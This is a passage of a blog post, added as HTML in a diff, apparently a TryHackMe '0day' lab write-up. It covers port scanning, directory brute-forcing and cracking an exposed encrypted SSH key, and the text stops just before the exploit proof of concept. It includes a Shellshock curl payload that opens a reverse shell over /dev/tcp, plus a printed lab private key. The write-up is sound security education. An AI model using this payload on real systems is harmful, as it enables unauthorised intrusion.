@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta
+    name="description"
+    content=""
+  />
+  
+    
+      <title>0day - TryHackMe Writeup | Supaaasuge&#39;s Blog</title>
+    
+  
+  <link rel="stylesheet" href="/css/reset.css"/>
+  <link rel="stylesheet" href="/css/font.css"/>
+  <link rel="stylesheet" href="/css/smigle.css"/>
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+</head>
+
+  <body>
+    <div id="root">
+      <header>
+  <div id="brand">
+    <a class="icon-link" href="https://supaaasuge.github.io/">
+      <img
+        class="icon"
+        src="/images/brandIcon.svg"
+      />
+    </a>
+    <div class="text">
+      <a href="https://supaaasuge.github.io/"><h1>Supaaasuge&#39;s Blog</h1></a>
+      <h3>Aspiring IT/Cybersecurity Professional</h3>
+    </div>
+  </div>
+  <nav>
+    
+      
+        
+        <a href="/"><b>Home</b></a>
+      
+         | 
+        <a href="/about/"><b>About</b></a>
+      
+         | 
+        <a href="/posts/"><b>Posts</b></a>
+      
+         | 
+        <a href="/categories/"><b>Categories</b></a>
+      
+         | 
+        <a href="/tags/"><b>Tags</b></a>
+      
+         | 
+        <a href="/index.xml"><b>RSS</b></a>
+      
+    
+  </nav>
+  <hr />
+</header>
+
+      <div id="content">
+        
+  <main>
+    <article>
+      <h1 class="title">0day - TryHackMe Writeup</h1>
+      
+      <div class="post-meta">
+  <strong>
+    <span>Posted on</span>
+    <time>2024-05-07</time>
+    <span>in</span>
+    
+      <a href="/categories/tryhackme">TryHackMe</a>
+  </strong>
+  <span> • 1236 words</span>
+  <span> • 6 minute read</span>
+  
+  
+    <div>
+      <span>Tags:</span>
+      
+        <a href="/tags/hash-cracking">Hash Cracking</a>, 
+        <a href="/tags/shellshock">ShellShock</a>, 
+        <a href="/tags/cve-2015-1328">CVE-2015-1328</a>, 
+        <a href="/tags/ssh2john">ssh2john</a>
+    </div>
+  
+</div>
+
+      <div class="content"><p>0day is a Medium difficulty room from TryHackMe, I start off with a bit of enumeration before coming across a <code>.cgi</code> file on a particular endpoint that was vulnerable to ShellShock. Once I used ShellShock to get a foothold as www-data, I was able to perform further enumeration of the host. Due to the old Ubuntu version, I was able to then leverage CVE-2015-1328 to escalate my privileges to root.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>IP=<code>10.10.63.19</code></p>
+<p>Starting off as usual I will scan for open ports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#ae81ff">10000</span> -Pn $IP -oA init.scan
+</span></span><span style="display:flex;"><span>Warning: 10.10.63.19 giving up on port because retransmission cap hit <span style="color:#f92672">(</span>10<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.63.19
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.30s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">36407</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">29126</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp open  ssh
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span></code></pre></div><p>And from these open ports I will perform a service version + TCP scan.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -p22,80 -sCVT -O -Pn -oA scvto.scan 10.10.63.19
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.63.19
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.30s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">1024</span> 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.7 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: 0day
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.7 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+</span></span><span style="display:flex;"><span>Aggressive OS guesses: Linux 3.10 - 3.13 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 5.4 <span style="color:#f92672">(</span>94%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.2 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span>Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Sony Android TV <span style="color:#f92672">(</span>Android 5.0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Android 5.0 - 6.0.1 <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Android 5.1 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">4</span> hops
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Tue May  7 20:47:26 2024 -- 1 IP address (1 host up) scanned in 26.50 seconds</span>
+</span></span></code></pre></div><p>Port 22: <code>OpenSSH 6.6.1p1 Ubuntu</code>
+Port 80: <code>Apache httpd 2.4.7</code></p>
+<p>Moving on to the website on port 80, I will start off with gobuster:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.63.19/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x cgi,bin,html,php,pdf,py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</span></span><span style="display:flex;"><span>...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/.html                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 283<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 3025<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/cgi-bin              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 311<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.63.19/cgi-bin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/img                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 307<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.63.19/img/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 311<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.63.19/uploads/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/admin                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 309<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.63.19/admin/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 307<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.63.19/css/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 306<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.63.19/js/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/backup               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 310<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.63.19/backup/
+</span></span></code></pre></div><p><img src="/posts/0day-thm-1.png" alt="alt 3"></p>
+<p><code>/cgi-bin</code>:
+<img src="/posts/0day-thm-2.png" alt="alt 4"></p>
+<p>I am going to try and fuzz this endpoint some more as this looks like it is a directory, however I am going to try <code>feroxbuster</code> for this as it does a good job of automating this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -u http://$IP/cgi-bin --smart -x gci,php,txt,html
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>      GET        0l        0w       13c http://10.10.63.19/cgi-bin/test.cgi
+</span></span></code></pre></div><p>Nice! Before I go and check this out, I am going to look at some of the other endpoints:</p>
+<p>But first I am going to check out <code>/backup</code>
+<img src="/posts/0day-thm-3.png" alt="alt 3"></p>
+<p>Looks like we have an encrypted RSA private key encrypted with AES-128 in CBC mode of operation. I&rsquo;ll go ahead and convert this private key to a hash for cracking using <code>ssh2john</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/THM/0-day<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ wget http://10.10.63.19/backup -O key.pem
+</span></span><span style="display:flex;"><span>--2024-05-07 21:05:53--  http://10.10.63.19/backup
+</span></span><span style="display:flex;"><span>Connecting to 10.10.63.19:80... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">301</span> Moved Permanently
+</span></span><span style="display:flex;"><span>Location: http://10.10.63.19/backup/ <span style="color:#f92672">[</span>following<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>--2024-05-07 21:05:53--  http://10.10.63.19/backup/
+</span></span><span style="display:flex;"><span>Reusing existing connection to 10.10.63.19:80.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">1767</span> <span style="color:#f92672">(</span>1.7K<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>text/html<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: ‘key.pem’
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key.pem            100%<span style="color:#f92672">[===============</span>&gt;<span style="color:#f92672">]</span>   1.73K  --.-KB/s    in 0s      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2024-05-07 21:05:54 <span style="color:#f92672">(</span><span style="color:#ae81ff">323</span> MB/s<span style="color:#f92672">)</span> - ‘key.pem’ saved <span style="color:#f92672">[</span>1767/1767<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/THM/0-day<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>backup                                            key.pem
+</span></span><span style="display:flex;"><span>ferox-http_10_10_63_19_cgi-bin_-1715130108.state  scvto.scan.gnmap
+</span></span><span style="display:flex;"><span>init.scan.gnmap                                   scvto.scan.nmap
+</span></span><span style="display:flex;"><span>init.scan.nmap                                    scvto.scan.xml
+</span></span><span style="display:flex;"><span>init.scan.xml
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/THM/0-day<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat key.pem
+</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>Proc-Type: 4,ENCRYPTED
+</span></span><span style="display:flex;"><span>DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
+</span></span><span style="display:flex;"><span>H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
+</span></span><span style="display:flex;"><span>FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
+</span></span><span style="display:flex;"><span>Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
+</span></span><span style="display:flex;"><span>9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
+</span></span><span style="display:flex;"><span>IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
+</span></span><span style="display:flex;"><span>SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
+</span></span><span style="display:flex;"><span>/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
+</span></span><span style="display:flex;"><span>w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
+</span></span><span style="display:flex;"><span>6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
+</span></span><span style="display:flex;"><span>Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
+</span></span><span style="display:flex;"><span>xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
+</span></span><span style="display:flex;"><span>8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
+</span></span><span style="display:flex;"><span>b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
+</span></span><span style="display:flex;"><span>vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
+</span></span><span style="display:flex;"><span>wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
+</span></span><span style="display:flex;"><span>rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
+</span></span><span style="display:flex;"><span>RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
+</span></span><span style="display:flex;"><span>oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
+</span></span><span style="display:flex;"><span>cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
+</span></span><span style="display:flex;"><span>99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
+</span></span><span style="display:flex;"><span>Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
+</span></span><span style="display:flex;"><span>Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
+</span></span><span style="display:flex;"><span>v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
+</span></span><span style="display:flex;"><span>gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
+</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/THM/0-day<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh2john key.pem &gt; hash                          
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/THM/0-day<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat hash        
+</span></span><span style="display:flex;"><span>key.pem:$sshng$1$16$82823EE792E75948EE2DE731AF1A0547$1200$4fbf85fb78a59b915c159c76e269ebba0318e39e6f238eb5ce231be0d624f58255e6ec1caf1e107e53f6436564f298711f83fe3cb6fbf6709cd12ac138f065074577a632c96dfda129b65acc52edab816366aeba68b2c8af6751c3be0ccc748c1739c523b8ecc581703d4a99b64cf9b13717d5a7dc87e214e7f21de334d3b023bcaaab3aaafe5090c5d51acefb1769122da7f1d2625d72ebbfe5a477363355b65b8a672897227b245e20b4d7e627864aa3978232edf1339f6a999ca28f54fbfcf739440a31114b2b1b50a61c7271649c1d43c2e244c43fdeac64622c160e1ae31ab5cf84a1a80a906a52666e05b5c20e22bc317b20a1237daf26cf56f773d4a8732008919712963bfc834c5106a10dfdf09e5561042d745161fda6220eba934d4a48d26eb2313a058984872913d04b5541389dd00c8b7b74e4c635534928effbef8739dd79971685527749d708031e20ff90ff62a70bb6dfed29b2f2bb2820936dcdceeb299db530656a28e5fbe0fa312046e77dd2ce1d0d630451119d0765adc3bb982458638a3c3cb70f16c1a3c71d0798b4782bb708660bf80b8f583102ae77d900209971a86b35dddc878546d181ebe1cb0e5f15443cf5ff889985a7c30b682284a7963a398b87cdd0a8ac1ae2cd57201e8128f652fce83233844c9cddee666bf5ac33cbfb4cb3b7a03904710d5df90d7c5591590c6f2ad8869522e6cb03cfe4e1e7bf49b36f5e901b412cd453e5c615721edfd62a569565f4ddac99de4e7f14bb7bd9f363057fe7af6dd30f64cc7d5dcdc8c7bfe115e23109da0c3788baf01a1915005ca0968eb9f9cb9130b4847c4ded3fedfd0bdc688b1648559d830c276056899dc1de123eddd619e6b008a26fbf437f2dfce3f9678d932d5f5357204821cd08f981af131671def2e983371e42ab91a960dd4152d7d6158aad906727bf32d224cd3b44082a03e48f018f250a75def2037e36fffdfbffbfba279f785b4e9aba435369117ebf49859631f5390bc13a8e3f45d68eab9f58d1085d7229c1715cb6965a110702e342e96c11930e25564d0cb1f00b88e9839f22dfa4eb87c6aed7e358f56fdf218e2668aa40e6bcfe90c682d34f827266145ac1cb6777ecacd2a0da5395799e4ff76b91e4da3fa616453cfc21e83e7e656db2041e959438e26872d2f138f28f762b18f7b8007a8d9a7c8f18000a970d06dde2b20ec7fddabaa18893b4226b2f721cb53ac4b815bc804dfb51b491a93ba3f45a32fb29c698d3f1e4741e0b968efc6a1e487d057a54e47102a20c3c47abb98b3096493b4a2a7497ece89b7f24ee20cdd061dc9b74801a0a9d731563b3f9bbc75aff8b15fa4244f7dc7b0e1f185e78f502cda063e30c40756ebc2a67c1147b5cb98af058f74d953e5872b93fa5b97cb2bbbb7315b757aa1337f6ea58216e71149f5eca2aef9543a11d20f2f5e741d292ce55fb67c2f094d0d5f977ac8f6fa303cfb82f1a363f9042ee66eb903952b9abf18d35fd68ea9f6c02eeea71cedea134120c6dc36b9dd66483cd1f78a67c443ef013b131965da1bf748130c093e59ac116ae7889ad28853850f219253ea62175279b910b54e473d887e10bfef5352fd3df1afd338a9b2d81b2c53923e9f869a49674698a1697686617b2829f5ef03118254885b6962c0a790326c88971f2056b1b85b49130af8f
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/THM/0-day<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ john hash --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>Created directory: /home/kali/.john
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>SSH, SSH private key <span style="color:#f92672">[</span>RSA/DSA/EC/OPENSSH 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>KDF/cipher <span style="color:#f92672">[</span>0<span style="color:#f92672">=</span>MD5/AES 1<span style="color:#f92672">=</span>MD5/3DES 2<span style="color:#f92672">=</span>Bcrypt/AES<span style="color:#f92672">])</span> is <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Cost <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">for</span> all loaded hashes
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">10</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>letmein          <span style="color:#f92672">(</span>key.pem<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2024-05-07 21:06<span style="color:#f92672">)</span> 25.00g/s 14000p/s 14000c/s 14000C/s teiubesc..ganda
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Password: <code>letmein</code></p>
+<p>Sadly, I don&rsquo;t have a username to go with this so I decided to do some research on <code>.cgi</code> files.</p>
+<ul>
+<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi?ref=benheater.com#shellshock">Source</a></li>
+</ul>
+<h3 id="cgi">CGI</h3>
+<p>CGI scripts are perl scripts, if you have a compromised server that can execute <code>.cgi</code> scripts you can upload a perl reverse shell, and change the extension from <code>.pl</code> to <code>.cgi</code>.</p>
+<h4 id="shellshock-explained">ShellShock explained</h4>
+<p><strong>ShellShock</strong> is a <strong>vulnerability</strong> that affects the widely used <strong>Bash</strong> command-line shell in Unix-based operating systems. It targets the ability of Bash to run commands passed by applications. The vulnerability lies in the manipulation of <strong>environment variables</strong>, which are dynamic named values that impact how processes run on a computer. Attackers can exploit this by attaching <strong>malicious code</strong> to environment variables, which is executed upon receiving the variable. This allows attackers to potentially compromise the system.</p>
+<p>Checking for the <code>shellshock</code> vulnerability:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p80 --script http-shellshock --script-args uri<span style="color:#f92672">=</span>/cgi-bin/test.cgi 10.10.63.19
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span><span style="display:flex;"><span>| http-shellshock: 
+</span></span><span style="display:flex;"><span>|   VULNERABLE:
+</span></span><span style="display:flex;"><span>|   HTTP Shellshock vulnerability
+</span></span><span style="display:flex;"><span>|     State: VULNERABLE <span style="color:#f92672">(</span>Exploitable<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|     IDs:  CVE:CVE-2014-6271
+</span></span><span style="display:flex;"><span>|       This web application might be affected by the vulnerability known
+</span></span><span style="display:flex;"><span>|       as Shellshock. It seems the server is executing commands injected
+</span></span><span style="display:flex;"><span>|       via malicious HTTP headers.
+</span></span><span style="display:flex;"><span>|             
+</span></span><span style="display:flex;"><span>|     Disclosure date: 2014-09-24
+</span></span><span style="display:flex;"><span>|     References:
+</span></span><span style="display:flex;"><span>|       http://www.openwall.com/lists/oss-security/2014/09/24/10
+</span></span><span style="display:flex;"><span>|       http://seclists.org/oss-sec/2014/q3/685
+</span></span><span style="display:flex;"><span>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2014-7169
+</span></span><span style="display:flex;"><span>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2014-6271
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 3.56 seconds
+</span></span></code></pre></div><p>As seen on the post on hack trickz, we can exploit this using curl as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Cookie: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/LOCAL_IP/PORT 0&gt;&amp;1&#39;</span> http://MACHINE_IP/cgi-bin/test.cgi
+</span></span></code></pre></div><p>Actual exploit PoC:</p>
